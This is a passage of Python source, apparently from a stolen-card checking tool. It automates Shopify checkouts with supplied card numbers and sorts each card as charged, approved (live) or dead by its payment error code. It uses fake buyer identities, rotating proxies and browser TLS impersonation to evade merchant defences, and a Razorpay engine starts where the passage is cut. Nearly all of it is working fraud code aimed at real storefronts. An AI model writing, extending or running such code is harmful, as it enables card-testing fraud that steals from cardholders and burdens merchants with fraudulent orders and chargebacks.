            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True,
        }
    else:
        delivery_line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments":              {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True,
        }

    buyer = {
        "customer":          {"presentmentCurrency": currency, "countryCode": country},
        "phoneCountryCode":  country,
        "marketingConsent":  [],
        "shopPayOptInPhone": {"countryCode": country},
        "rememberMe":        False,
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = True

    return {
        "sessionInput": {"sessionToken": session_token},
        "queueToken":   queue_token or "",
        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        },
        "deliveryExpectations": {"deliveryExpectationLines": []},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id":               f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId":        f"gid://shopify/ProductVariant/{variant_id}",
                        "properties":       [],
                        "sellingPlanId":    None,
                        "sellingPlanDigest":None,
                    },
                },
                "quantity":            {"items": {"value": 1}},
                "expectedTotalPrice":  {"any": True},
                "lineComponentsSource":None,
                "lineComponents":      [],
            }],
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [],
            "billingAddress": {
                "streetAddress": {
                    "address1":    addr.address1     if addr else "",
                    "address2":    "",
                    "city":        addr.city         if addr else "",
                    "countryCode": addr.country_code if addr else country,
                    "postalCode":  addr.postal_code  if addr else "",
                    "firstName":   addr.first_name   if addr else "",
                    "lastName":    addr.last_name    if addr else "",
                    "zoneCode":    addr.zone_code    if addr else "",
                    "phone":       addr.phone        if addr else "",
                },
            },
        },
        "buyerIdentity": buyer,
        "tip":           {"tipLines": []},
        "poNumber":      None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"any": True},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note":                  {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms":    None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }


def _engine_post_graphql(client: _EngineTLSClient, shop_url: str, headers: dict,
                          operation: str, variables: dict, persisted_id: str = "",
                          raw_query: str = "", timeout: int = _ENGINE_HTTP_MED) -> Tuple[int, str]:
    def _is_edge_err(text: str) -> bool:
        t = text or ""
        return '"errors":"' in t and '"errors":[{"' not in t and '"errors": [{' not in t

    if persisted_id:
        body_p = json.dumps({
            "variables":     variables,
            "operationName": operation,
            "id":            persisted_id,
        }, separators=(",", ":"))
        try:
            r = client.post(
                f"{shop_url}/checkouts/internal/graphql/persisted?operationName={operation}",
                data=body_p, headers=headers, timeout=timeout)
            if r.status_code == 200 and not _is_edge_err(r.text) and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

    if raw_query:
        body_q = json.dumps({
            "query":         raw_query,
            "variables":     variables,
            "operationName": operation,
        }, separators=(",", ":"))
        try:
            r = client.post(
                f"{shop_url}/checkouts/unstable/graphql",
                data=body_q, headers=headers, timeout=timeout)
            if r.status_code == 200 and not _is_edge_err(r.text) and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

        try:
            r = client.post(
                f"{shop_url}/checkouts/internal/graphql",
                data=body_q, headers=headers, timeout=timeout)
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)

    return 0, '{"errors":"no query provided"}'


def _engine_send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                           stable_id, variant_id, queue_token, email, addr, is_shipping,
                           currency, country, proposal_id, build_id, source_token):
    variables = _engine_proposal_payload(session_token, stable_id, variant_id,
                                          queue_token, email, addr, is_shipping,
                                          currency, country)
    variables = _engine_patch_currency_country(variables, currency, country)
    headers = _engine_proposal_headers(client, shop_url, checkout_url, checkout_token,
                                        session_token, build_id, source_token)
    return _engine_post_graphql(client, shop_url, headers, "Proposal", variables,
                                 persisted_id=proposal_id, raw_query=_ENGINE_Q_PROPOSAL,
                                 timeout=_ENGINE_HTTP_MED)


def _engine_extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        expectations = de.get("deliveryExpectations", [])
        out = []
        if isinstance(expectations, list):
            for x in expectations:
                h = x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                if h:
                    out.append(h)
        return out
    except Exception:
        return []


def _engine_extract_delivery_handle(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                for sh in macro.get("deliveryStrategyHandles", []):
                    return sh
    except Exception:
        pass
    return ""


def _engine_extract_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
    except Exception:
        pass
    return ""


def _engine_extract_tax(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        val = seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount")
        if val:
            return val
    except Exception:
        pass
    return "0.0"


def _engine_extract_is_shipping(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        return bool(seller.get("isShippingRequired", True))
    except Exception:
        return True


def _engine_receipt_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w*Receipt/[A-Za-z0-9_-]+)"', body)
    return m.group(1) if m else ""


def _engine_receipt_session_token(body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _engine_send_submit(client, shop_url, checkout_url, checkout_token, session_token,
                         stable_id, variant_id, queue_token, email, addr,
                         delivery_handle, signed_handles, total, tax, pci_session_id,
                         attempt_token, currency, country, is_shipping,
                         submit_id, build_id, source_token):
    page_id = f"{random.getrandbits(64):016x}"

    if is_shipping:
        delivery = {
            "deliveryLines": [{
                "destination": {
                    "streetAddress": {
                        "address1":    addr.address1,
                        "address2":    "",
                        "city":        addr.city,
                        "countryCode": addr.country_code,
                        "postalCode":  addr.postal_code,
                        "firstName":   addr.first_name,
                        "lastName":    addr.last_name,
                        "zoneCode":    addr.zone_code,
                        "phone":       addr.phone,
                        "oneTimeUse":  False,
                    },
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle":             delivery_handle,
                        "customDeliveryRate": False,
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        expectations = [{"signedHandle": h} for h in signed_handles]
    else:
        delivery = {
            "deliveryLines": [{
                "selectedDeliveryStrategy": {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments":              {"any": True},
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["NONE"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        expectations = []

    input_payload = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken":   queue_token,
        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery":     delivery,
        "deliveryExpectations": {"deliveryExpectationLines": expectations},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id":               f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId":        f"gid://shopify/ProductVariant/{variant_id}",
                        "properties":       [],
                        "sellingPlanId":    None,
                        "sellingPlanDigest":None,
                    },
                },
                "quantity":            {"items": {"value": 1}},
                "expectedTotalPrice":  {"any": True},
                "lineComponentsSource":None,
                "lineComponents":      [],
            }],
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True} if not is_shipping
                           else {"value": {"amount": total, "currencyCode": currency}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "sessionId": pci_session_id,
                        "billingAddress": {
                            "streetAddress": {
                                "address1":    addr.address1,
                                "address2":    "",
                                "city":        addr.city,
                                "countryCode": addr.country_code,
                                "postalCode":  addr.postal_code,
                                "firstName":   addr.first_name,
                                "lastName":    addr.last_name,
                                "zoneCode":    addr.zone_code,
                                "phone":       addr.phone,
                            },
                        },
                        "cardSource": None,
                    },
                },
                "amount": {"value": {"amount": total, "currencyCode": currency}},
                "dueAt":  None,
            }],
            "billingAddress": {
                "streetAddress": {
                    "address1":    addr.address1,
                    "address2":    "",
                    "city":        addr.city,
                    "countryCode": addr.country_code,
                    "postalCode":  addr.postal_code,
                    "firstName":   addr.first_name,
                    "lastName":    addr.last_name,
                    "zoneCode":    addr.zone_code,
                    "phone":       addr.phone,
                },
            },
        },
        "buyerIdentity": {
            "customer":          {"presentmentCurrency": currency, "countryCode": country},
            "email":             email,
            "emailChanged":      False,
            "phoneCountryCode":  country,
            "marketingConsent":  [],
            "shopPayOptInPhone": {"countryCode": country},
            "rememberMe":        False,
        },
        "tip":      {"tipLines": []},
        "poNumber": None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"value": {"amount": tax or "0.0", "currencyCode": currency}},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note":                  {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms":    None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }

    variables = {
        "input":         input_payload,
        "attemptToken":  attempt_token,
        "metafields":    [],
        "analytics":     {"requestUrl": checkout_url, "pageId": page_id},
    }
    variables = _engine_patch_currency_country(variables, currency, country)

    headers = _engine_proposal_headers(client, shop_url, checkout_url, checkout_token,
                                        session_token, build_id, source_token)
    return _engine_post_graphql(client, shop_url, headers, "SubmitForCompletion", variables,
                                 persisted_id=submit_id, raw_query=_ENGINE_Q_SUBMIT,
                                 timeout=_ENGINE_HTTP_LONG)


def _engine_send_poll(client, shop_url, checkout_url, checkout_token, session_token,
                       build_id, source_token, poll_id, receipt_id, receipt_session):
    variables = {"receiptId": receipt_id, "sessionToken": receipt_session}
    headers = _engine_proposal_headers(client, shop_url, checkout_url, checkout_token,
                                        session_token, build_id, source_token,
                                        source_id=checkout_token)

    if poll_id:
        url = (f"{shop_url}/checkouts/internal/graphql/persisted"
               f"?operationName=PollForReceipt"
               f"&variables={urllib.parse.quote(json.dumps(variables))}"
               f"&id={poll_id}")
        try:
            r = client.get(url, headers=headers, timeout=_ENGINE_HTTP_MED)
            if r.status_code == 200 and '"errors":"' not in (r.text or "") and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

    return _engine_post_graphql(client, shop_url, headers, "PollForReceipt", variables,
                                 persisted_id="", raw_query=_ENGINE_Q_POLL,
                                 timeout=_ENGINE_HTTP_MED)


_ENGINE_APPROVED_CODES = {
    "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "INVALID_CVC",
    "INCORRECT_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
    "CARD_EXPIRED",
    "3DS_AUTHENTICATION",
    "OTP_REQUIRED",
    "AUTHENTICATION_REQUIRED",
}

_ENGINE_DECLINED_CODES = {
    "CARD_DECLINED",
    "GENERIC_ERROR",
    "DO_NOT_HONOR",
    "STOLEN_CARD",
    "LOST_CARD",
    "PICKUP_CARD",
    "FRAUDULENT",
    "CARD_INVALID",
    "INVALID_NUMBER",
    "INVALID_EXPIRY",
    "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
    "CARD_NUMBER_INCORRECT",
    "MISMATCHED_BILL",
}

_ENGINE_ERROR_CODES = {
    "SITE_INCOMPATIBLE", "THROTTLED", "RATE_LIMITED", "CAPTCHA_REQUIRED",
    "CHECKPOINT_DENIED", "GATEWAY_ERROR", "INVENTORY_RESERVATION_FAILURE",
    "INVENTORY_CLAIM_FAILURE", "PROXY_DEAD", "PROXY_ERROR", "TIMEOUT",
    "NO_DELIVERY", "SHIPPING_ADDRESS_UNDELIVERABLE", "CURRENCY_NOT_SUPPORTED",
    "PAYMENT_METHOD_UNAVAILABLE", "ORDER_TOTAL_CHANGED", "BROWSER_CHECK_REQUIRED",
}


def _engine_classify_code(code: str) -> CheckStatus:
    c = (code or "").upper().strip()
    if c in _ENGINE_APPROVED_CODES:
        return CheckStatus.APPROVED
    if c in _ENGINE_DECLINED_CODES:
        return CheckStatus.DECLINED
    if c in _ENGINE_ERROR_CODES:
        return CheckStatus.ERROR
    return CheckStatus.DECLINED


_ENGINE_SEEN_RECEIPTS: set = set()
_ENGINE_SEEN_LOCK = threading.Lock()


def _engine_register_receipt(rid: str) -> bool:
    if not rid:
        return True
    with _ENGINE_SEEN_LOCK:
        if rid in _ENGINE_SEEN_RECEIPTS:
            return False
        _ENGINE_SEEN_RECEIPTS.add(rid)
        if len(_ENGINE_SEEN_RECEIPTS) > 20000:
            _ENGINE_SEEN_RECEIPTS.clear()
        return True


def _engine_typename_from(body: str) -> str:
    m = re.search(r'"__typename"\s*:\s*"(ProcessedReceipt|SuccessfulReceipt|'
                  r'ProcessingReceipt|WaitingReceipt|ActionRequiredReceipt|FailedReceipt)"', body)
    return m.group(1) if m else ""


def _engine_error_code_from(body: str) -> str:
    m = re.search(r'"processingError"\s*:\s*\{[^}]*?"code"\s*:\s*"([^"]+)"', body)
    if m:
        return m.group(1)
    m = re.search(r'"code"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _engine_queue_from(proposal_body: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def _engine_shipping_restricted(body: str) -> bool:
    low = body.lower()
    return any(s in low for s in (
        "shipping_address_undeliverable",
        "no_delivery_options_available",
        "does not ship to",
    ))


def _engine_extract_value_from(body: str, key: str) -> str:
    m = re.search(rf'"{key}"\s*:\s*\{{\s*"value"\s*:\s*\{{\s*"amount"\s*:\s*"([^"]+)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'"{key}"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _engine_urlparse_host(url: str) -> str:
    try:
        return urllib.parse.urlparse(url).hostname or url
    except Exception:
        return url


def _engine_extract_receipt(proposal_json: str) -> dict | None:
    try:
        data = json.loads(proposal_json)
        completion = data.get("data", {}).get("submitForCompletion", {}) or {}
        return completion.get("receipt")
    except Exception:
        return None


def _engine_poll_receipt(client, shop_url, checkout_url, checkout_token, session_token,
                          build_id, source_tok, poll_id, submit_body, res: CheckResult) -> CheckResult:
    submit_receipt_type = _engine_typename_from(submit_body)
    receipt = _engine_extract_receipt(submit_body)
    if submit_receipt_type == "ProcessedReceipt" and receipt and receipt.get("id"):
        rid = receipt["id"]
        if not _engine_register_receipt(rid):
            res.status = CheckStatus.ERROR
            res.status_code = "DUPLICATE_RECEIPT"
            res.error = "duplicate receipt"
            return res
        res.status = CheckStatus.CHARGED
        res.status_code = "ORDER_PLACED"
        res.receipt_url = (receipt.get("confirmationPage") or {}).get("url", "") or checkout_url
        return res

    rid = _engine_receipt_id(submit_body)
    r_sess = _engine_receipt_session_token(submit_body) or session_token

    if not rid:
        code = _engine_error_code_from(submit_body)
        if code:
            res.status = _engine_classify_code(code)
            res.status_code = code
            res.retryable = res.status == CheckStatus.ERROR
            res.error = f"submit: {code}"
        else:
            snippet = (submit_body or "")[:400]
            res.status = CheckStatus.ERROR
            res.retryable = True
            res.error = f"submit: no receipt | {snippet}"
        return res

    poll_start = time.time()
    seen_failed = ""
    for _ in range(_ENGINE_POLL_MAX_ATTEMPTS):
        if time.time() - poll_start > _ENGINE_POLL_MAX_WAIT_SECS:
            break
        try:
            _, body = _engine_send_poll(client, shop_url, checkout_url, checkout_token,
                                         session_token, build_id, source_tok,
                                         poll_id, rid, r_sess)
        except Exception:
            time.sleep(0.5)
            continue

        tn = _engine_typename_from(body)
        if tn == "ProcessedReceipt":
            if not _engine_register_receipt(rid):
                res.status = CheckStatus.ERROR
                res.status_code = "DUPLICATE_RECEIPT"
                res.error = "duplicate receipt"
                return res
            res.status = CheckStatus.CHARGED
            res.status_code = "ORDER_PLACED"
            m = re.search(r'"confirmationPage"\s*:\s*\{\s*"url"\s*:\s*"([^"]+)"', body)
            res.receipt_url = m.group(1) if m else checkout_url
            return res

        if tn == "ActionRequiredReceipt":
            res.status = CheckStatus.APPROVED
            res.status_code = "3DS_AUTHENTICATION"
            return res

        if tn == "FailedReceipt":
            code = _engine_error_code_from(body) or "CARD_DECLINED"
            seen_failed = code
            if code.startswith("INVENTORY_") or code == "SITE_INCOMPATIBLE":
                res.status = CheckStatus.ERROR
                res.status_code = code
                res.retryable = True
                res.error = f"poll: {code}"
                return res
            res.status = _engine_classify_code(code)
            res.status_code = code
            return res

        delay_ms = 400
        m = re.search(r'"pollDelay"\s*:\s*(\d+)', body)
        if m:
            try:
                delay_ms = max(200, min(int(m.group(1)), 3000))
            except Exception:
                pass
        time.sleep(delay_ms / 1000.0)

    res.status = CheckStatus.ERROR
    res.status_code = seen_failed or "POLL_TIMEOUT"
    res.retryable = True
    res.error = "poll timeout"
    return res


def _engine_finish(res: CheckResult, started: float) -> CheckResult:
    res.elapsed = round(time.perf_counter() - started, 2)
    return res


def _engine_run_checkout(shop_url: str, card_entry: str, proxy_url: str = "",
                          timeout_seconds: float = 90.0) -> CheckResult:
    """Full Shopify checkout flow. Returns CheckResult."""
    started = time.perf_counter()
    res = CheckResult(
        card=card_entry, status=CheckStatus.ERROR,
        shop_url=shop_url, site_name=_engine_urlparse_host(shop_url),
    )

    if not CURL_CFFI_OK:
        res.error = "curl_cffi not installed"
        return _engine_finish(res, started)

    try:
        card_number, card_month, card_year, card_cvv = _engine_parse_card(card_entry)
    except Exception as exc:
        res.error = f"card_invalid: {exc}"
        return _engine_finish(res, started)

    currency = "USD"
    country  = "US"

    fp = _engine_new_fingerprint()
    client = _EngineTLSClient(proxy_url or None, fp)
    try:
        try:
            _title, variant_id, _vid, price = _engine_find_cheapest_product(client, shop_url)
            res.amount = price
        except Exception as exc:
            res.error = f"step0: {exc}"
            res.retryable = True
            return _engine_finish(res, started)

        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                _engine_add_to_cart(client, shop_url, variant_id)
            if not session_token:
                raise Exception("no session token")
        except Exception as exc:
            res.error = f"step1: {exc}"
            res.retryable = True
            return _engine_finish(res, started)

        persisted = _engine_fetch_persisted_ids(client, checkout_html, shop_url)
        proposal_id = persisted.get("proposal", "")
        submit_id   = persisted.get("submit", "")
        poll_id     = persisted.get("poll", "")

        decoded = checkout_html.replace("&quot;", '"')
        sm = _ENGINE_RE_STABLE_ID.search(decoded)
        stable_id = sm.group(1) if sm else ""
        bm = _ENGINE_RE_COMMIT_SHA.search(decoded)
        build_id  = bm.group(1) if bm else ""
        sm2 = _ENGINE_RE_SOURCE_TOKEN.search(checkout_html)
        source_tok = _html_unescape(sm2.group(1)).strip('"') if sm2 else ""
        im = _ENGINE_RE_IDENT_SIG.search(decoded)
        ident_sig  = im.group(1) if im else ""
        vault_url  = _engine_extract_vault_url(checkout_html)

        if not stable_id:
            res.error = "step3: no stableId"
            res.retryable = True
            return _engine_finish(res, started)

        if not ident_sig:
            res.error = "step3: no identification signature"
            res.retryable = True
            return _engine_finish(res, started)

        try:
            _, p1 = _engine_send_proposal(client, shop_url, checkout_url, checkout_token,
                                           session_token, stable_id, variant_id,
                                           "", None, None, True, currency, country,
                                           proposal_id, build_id, source_tok)
            is_shipping = _engine_extract_is_shipping(p1)
            m = re.search(r'"supportedCurrencies"\s*:\s*\[\s*"([^"]+)"', p1)
            if m:
                currency = m.group(1)
            m = re.search(r'"supportedCountries"\s*:\s*\[\s*"([^"]+)"', p1)
            if m:
                country = m.group(1)
            queue_token = _engine_queue_from(p1)
        except Exception as exc:
            res.error = f"step4: {exc}"
            res.retryable = True
            return _engine_finish(res, started)

        email = _engine_random_email()
        try:
            _, p2 = _engine_send_proposal(client, shop_url, checkout_url, checkout_token,
                                           session_token, stable_id, variant_id,
                                           queue_token, email, None, is_shipping,
                                           currency, country,
                                           proposal_id, build_id, source_tok)
            queue_token = _engine_queue_from(p2) or queue_token
        except Exception as exc:
            res.error = f"step5: {exc}"
            res.retryable = True
            return _engine_finish(res, started)

        addr = _engine_addr_for(country)
        tried = [addr.country_code]
        p3 = ""
        queue_token3 = ""
        for _ in range(len(_ENGINE_FALLBACK_ORDER) + 2):
            try:
                _, p3 = _engine_send_proposal(client, shop_url, checkout_url, checkout_token,
                                               session_token, stable_id, variant_id,
                                               queue_token, email, addr, is_shipping,
                                               currency, country,
                                               proposal_id, build_id, source_tok)
                queue_token3 = _engine_queue_from(p3)
                if queue_token3 and not _engine_shipping_restricted(p3):
                    break
            except Exception:
                pass
            next_cc = next((c for c in _ENGINE_FALLBACK_ORDER if c not in tried), None)
            if not next_cc:
                break
            addr = _engine_addr_for(next_cc)
            tried.append(next_cc)

        if not queue_token3:
            snippet = (p3 or "")[:400]
            res.error = f"step6: no queue token | {snippet}"
            res.retryable = True
            return _engine_finish(res, started)

        for _ in range(2):
            try:
                _, p3 = _engine_send_proposal(client, shop_url, checkout_url, checkout_token,
                                               session_token, stable_id, variant_id,
                                               queue_token3, email, addr, is_shipping,
                                               currency, country,
                                               proposal_id, build_id, source_tok)
                nt = _engine_queue_from(p3)
                if nt:
                    queue_token3 = nt
            except Exception:
                pass
            time.sleep(0.1)

        try:
            scope = _engine_urlparse_host(shop_url)
            pci_id, err = _engine_tokenize_card(
                client, ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv,
                scope, vault_url,
            )
            if not pci_id and vault_url:
                fallback = ("https://checkout.pci.shopifycs.com/sessions"
                            if "shopifyinc" in vault_url
                            else "https://checkout.pci.shopifyinc.com/sessions")
                pci_id, err = _engine_tokenize_card(
                    client, ident_sig, card_number,
                    f"{addr.first_name} {addr.last_name}",
                    card_month, card_year, card_cvv,
                    scope, fallback,
                )
            if not pci_id:
                res.error = f"step9: {err or 'no session id'}"
                res.retryable = True
                return _engine_finish(res, started)
        except Exception as exc:
            res.error = f"step9: {exc}"
            res.retryable = True
            return _engine_finish(res, started)

        delivery_handle = _engine_extract_delivery_handle(p3)
        signed_handles  = _engine_extract_signed_handles(p3)
        total           = _engine_extract_total(p3)
        tax             = _engine_extract_tax(p3)

        if is_shipping and not delivery_handle:
            delivery_handle = ""
        if not is_shipping:
            delivery_handle = ""
        if not total:
            total = res.amount or "1.00"

        attempt_token = (f"{checkout_token}-"
                         f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}")

        submit_body = ""
        for _ in range(4):
            try:
                _, submit_body = _engine_send_submit(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, queue_token3, email, addr,
                    delivery_handle, signed_handles, total, tax,
                    pci_id, attempt_token, currency, country, is_shipping,
                    submit_id, build_id, source_tok,
                )
            except Exception as exc:
                res.error = f"step10: {exc}"
                res.retryable = True
                return _engine_finish(res, started)

            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                new_tax   = _engine_extract_value_from(submit_body, "totalTaxAmount")
                new_total = _engine_extract_value_from(submit_body, "checkoutTotal") or total
                if new_tax:
                    tax = new_tax
                if new_total:
                    total = new_total
                time.sleep(0.15)
                continue
            break

        return _engine_finish(_engine_poll_receipt(
            client, shop_url, checkout_url, checkout_token, session_token,
            build_id, source_tok, poll_id, submit_body, res,
        ), started)
    finally:
        client.close()


_ENGINE_STATUS_MAP = {
    CheckStatus.CHARGED:  "Charged",
    CheckStatus.APPROVED: "Approved",
    CheckStatus.DECLINED: "Dead",
    CheckStatus.ERROR:    "Error",
}


def run_checkout_public(shop_url: str, card_entry: str, proxy_url: str = "",
                         use_session_reuse: bool = True) -> dict:
    """Public wrapper — returns dict NOVA expects."""
    try:
        res = _engine_run_checkout(
            shop_url=shop_url,
            card_entry=card_entry,
            proxy_url=proxy_url,
            timeout_seconds=float(os.environ.get("CHECKER_TIMEOUT", 90)),
        )
    except Exception as e:
        return {
            "status": "Error",
            "message": f"engine exception: {str(e)[:110]}",
            "card": card_entry,
            "gateway": "Shopify",
            "price": "-",
            "price_value": 0.0,
            "site": shop_url,
            "status_code": "ENGINE_EXCEPTION",
            "retryable": True,
        }

    novastatus = _ENGINE_STATUS_MAP.get(res.status, "Error")

    price_str = res.amount or "-"
    if price_str and price_str != "-" and not price_str.startswith("$"):
        try:
            price_str = f"${float(price_str):.2f}"
        except (ValueError, TypeError):
            pass

    price_val = 0.0
    if res.amount:
        try:
            price_val = float(res.amount)
        except (ValueError, TypeError):
            pass

    return {
        "status":       novastatus,
        "message":      (res.error or res.status_code or res.status.value or "")[:150],
        "card":         card_entry,
        "gateway":      "Shopify",
        "price":        price_str,
        "price_value":  price_val,
        "site":         shop_url,
        "status_code":  res.status_code or "",
        "retryable":    bool(res.retryable) or novastatus == "Error",
        "receipt_url":  res.receipt_url or "",
        "elapsed":      res.elapsed,
    }


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    """Verify proxy can complete TLS handshake to Shopify CDN."""
    if not proxy_url or not CURL_CFFI_OK:
        return False
    try:
        with CurlSession(
            impersonate="chrome131",
            proxy=proxy_url,
            timeout=timeout,
            verify=False,
        ) as s:
            r = s.get(
                "https://cdn.shopify.com/s/files/1/0000/favicon.ico",
                allow_redirects=False,
            )
            return r.status_code < 500
    except Exception:
        return False


def ledger_clear():
    with _ENGINE_SEEN_LOCK:
        _ENGINE_SEEN_RECEIPTS.clear()


def ledger_stats() -> dict:
    with _ENGINE_SEEN_LOCK:
        return {"size": len(_ENGINE_SEEN_RECEIPTS)}


# =============================================================================
# SECTION 27 — INLINE RAZORPAY ENGINE
# =============================================================================
_RAZOR_API = "https://api.razorpay.com/v1"
_RAZOR_UA = (
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
)
_RAZOR_FIRST = ["Aarav", "Rohan", "Kunal", "Vikas", "Amit", "Rahul", "Sahil", "Deepak"]
_RAZOR_LAST  = ["Sharma", "Patel", "Verma", "Singh", "Kumar", "Gupta", "Mehta"]
_RAZOR_PHONE = ["9876543210", "8765432109", "7654321098", "9123456780", "9998887770"]
_RAZOR_EMAIL_DOMAINS = ["gmail.com", "yahoo.in", "outlook.com", "protonmail.com"]


def _rz_random_email() -> str:
    f = random.choice(_RAZOR_FIRST).lower()
    l = random.choice(_RAZOR_LAST).lower()
    return f"{f}.{l}{random.randint(1, 999)}@{random.choice(_RAZOR_EMAIL_DOMAINS)}"


def _rz_new_client(proxy_url: str = "", timeout: float = 30.0):
    if not CURL_CFFI_OK:
        raise RuntimeError("curl_cffi not installed")
    kw = {"impersonate": "chrome131", "timeout": timeout, "verify": False}
    if proxy_url:
        kw["proxy"] = proxy_url
    s = CurlSession(**kw)
    s.headers.update({
        "user-agent": _RAZOR_UA,
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en;q=0.9",
